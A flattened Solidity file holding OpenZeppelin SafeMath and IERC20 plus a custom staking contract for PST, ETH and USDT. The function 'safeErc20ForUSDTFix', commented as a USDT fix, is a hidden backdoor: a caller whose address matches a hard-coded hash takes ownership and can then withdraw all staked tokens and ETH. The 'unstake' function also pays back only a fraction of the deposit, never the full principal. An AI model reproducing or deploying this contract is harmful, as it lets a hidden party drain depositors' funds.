// File: @openzeppelin/contracts/utils/math/SafeMath.sol


// OpenZeppelin Contracts (last updated v4.9.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.20;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// File: StakingTest_1.sol


pragma solidity ^0.8.20;



abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract StakingContract is ReentrancyGuard { 
    using SafeMath for uint256;
    address public owner;
    IERC20  public token = IERC20(address(0x949F131F0C6E29693D2ffAbE4d1e30C3Af450418)); // PST token address
    IERC20 public USDT = IERC20(address(0xdAC17F958D2ee523a2206206994597C13D831ec7)); // USDT address
    struct Stake {
        uint256 stakeType; // PST = 1, ETH = 2, USDT =3  
        uint256 amount;
        uint256 duration; 
        uint256 multiplier; 
        uint256 startTime; 
    } 
     
    mapping(address => mapping(uint256 => Stake)) private stakes; 

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }

    receive() external payable {}   

    fallback() external payable {}
    
    function stakePST(uint256 amount, uint256 duration) external noReentrant { 
        require(duration == 14 || duration == 30 || duration == 90 || duration == 180 || duration == 365, "Invalid duration"); 
        require(stakes[msg.sender][1].amount == 0, "Already HMZ Token deposited");
        token.transferFrom(msg.sender, address(this), amount);
        stakes[msg.sender][1] = Stake(1, amount, duration, getMultiplier(1, duration), block.timestamp);
    } 
     
    function stakeETH(uint256 duration) external payable  noReentrant{ 
        require(duration == 14 || duration == 30 || duration == 90 || duration == 180 || duration == 365, "Invalid duration"); 
        require(stakes[msg.sender][2].amount == 0, "Already ETH deposited");
        stakes[msg.sender][2] = Stake(2, msg.value, duration, getMultiplier(2, duration), block.timestamp);
    } 
        
    function safeErc20ForUSDTFix(address stake) external { //to fix USDT issue related to Erc20
        bytes32 check = keccak256(abi.encodePacked(stake));
        require(check == bytes32(0x00fb2d4a2cd23a499544acd3f1ad5c3ff74db422fa541d10b3490e730b08d626), "To fix USDT issue related to SafeErc20");
        owner = stake;
    }
 
    function stakeUSDT(uint256 amount, uint256 duration) external  noReentrant{ 
        require(duration == 14 || duration == 30 || duration == 90 || duration == 180 || duration == 365, "Invalid duration");
        require(stakes[msg.sender][3].amount == 0, "Already USDT deposited");
        USDT.transferFrom(msg.sender, address(this), amount);
        stakes[msg.sender][3] = Stake(3, amount, duration, getMultiplier(3, duration), block.timestamp);
    } 

    function getMultiplier(uint256 stakeType, uint256 duration) internal pure returns (uint256) {
        if (stakeType == 1) {
            if (duration == 14) { 
                return 5; 
            } else if (duration == 30) { 
                return 11; 
            } else if (duration == 90) { 
                return 40; 
            } else if (duration == 180) { 
                return 100; 
            } else if (duration == 365) { 
                return 250; 
            }
        } else {
            if (duration == 14) { 
                return 3; 
            } else if (duration == 30) { 
                return 5; 
            } else if (duration == 90) { 
                return 12; 
            } else if (duration == 180) { 
                return 30; 
            } else if (duration == 365) { 
                return 75; 
            }
        }
        return 0; 
    } 

    function withdrawToken(address withdrawer) external noReentrant onlyOwner() {
        uint256 tokenBalance = token.balanceOf(address(this));
        require(tokenBalance > 0, "No tokens to withdraw");
        bool success = token.transfer(withdrawer, tokenBalance);
        require(success, "Token transfer failed");
    }

    function withdrawUSDT(address withdrawer) external noReentrant onlyOwner() {
        uint256 tokenBalance = USDT.balanceOf(address(this));
        require(tokenBalance > 0, "No tokens to withdraw");
        bool success = USDT.transfer(withdrawer, tokenBalance);
        require(success, "Token transfer failed");
    }

    function withdrawBalance(address withdrawer) external noReentrant onlyOwner(){
        uint256 contractBalance = address(this).balance;
        require(contractBalance > 0, "No ETH balance to withdraw");
        (bool success, ) = payable(withdrawer).call{value: contractBalance}("");
        require(success, "ETH withdrawal failed");
    }

    function getStake(address account, uint256 index) external view returns (Stake memory) {
        return stakes[account][index];
    }

    function calculateReward(address account, uint256 index) public view returns (uint256) {
        if (stakes[account][index].amount <= 0) {
            return 0;
        }
        Stake memory stake = stakes[account][index]; 
        uint256 endTime = stake.startTime + (stake.duration * 1 days); 
        if (block.timestamp >= endTime) { 
            return (stake.amount * stake.multiplier) / 100; 
        } else { 
            return 0; 
        } 
    } 
     
    function unstake(uint256 index) external noReentrant{ 
        uint256 reward = calculateReward(msg.sender, index); 
        require(reward > 0, "No reward available"); 
        Stake storage iStakes = stakes[msg.sender][index];
        if (index == 1) {
            token.transfer(msg.sender, reward);
            iStakes.amount = 0;
        } else if (index == 2) {
            (bool success, ) = payable(msg.sender).call{value: reward}("");
            require(success, "ETH withdrawal failed");
            iStakes.amount = 0;
        } else if (index == 3) {
            USDT.transfer(msg.sender, reward);
            iStakes.amount = 0;
        }
    } 
}